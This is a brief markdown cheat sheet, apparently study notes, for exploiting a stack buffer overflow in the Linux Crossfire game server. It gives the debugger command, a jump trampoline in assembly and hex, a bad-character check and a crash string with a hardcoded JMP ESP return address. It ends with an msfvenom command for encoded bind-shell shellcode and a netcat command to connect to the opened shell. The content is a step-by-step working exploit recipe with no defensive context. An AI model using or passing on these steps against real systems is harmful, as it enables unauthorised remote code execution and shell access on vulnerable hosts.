# Linux Buffer Overflows

## Run Evans Debugger against an app
        - edb --run /usr/games/crossfire/bin/crossfire
## ESP register points toward the end of our CBuffer
        - add eax,12
        - jmp eax
        - 83C00C add eax,byte +0xc
        - FFE0 jmp eax

### Check for “Bad Characters”
Process of elimination -
```
Run multiple times 0x00 - 0xFF
```
## Find JMP ESP address
```
    - "\x97\x45\x13\x08" # Found at Address 08134597
    - crash = "\x41" * 4368 + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90"
```
##ShellCode:
```
    - msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai
```
## Connect to the shell with netcat:

```
        - nc -v $ip 4444
```
